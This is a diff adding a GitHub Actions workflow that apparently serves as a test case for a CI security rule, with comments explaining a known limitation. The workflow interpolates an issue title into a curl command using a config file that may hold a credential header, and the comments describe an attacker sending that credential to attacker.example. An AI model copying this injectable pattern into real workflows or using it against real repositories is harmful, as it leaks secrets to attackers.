@@ -1,0 +1,19 @@
+# situation: on issues, a step sends a request with curl to the host the
+#   issue's title names, with the options of the file ci/curl.conf of the
+#   repository.
+# reason: a limitation (run time): the file may hold a header with a
+#   credential, which then goes to the attacker's host.
+# cause: the rule reads the words of the command, not the files curl reads.
+# attack: the attacker opens an issue titled attacker.example, the host of a
+#   server the attacker runs.
+# attack-run-behavior: curl sends the request with the options of
+#   ci/curl.conf, a header with a credential among them, to
+#   attacker.example.
+on: issues
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: |
+          curl -fsS -K ci/curl.conf "https://${{ github.event.issue.title }}/status"
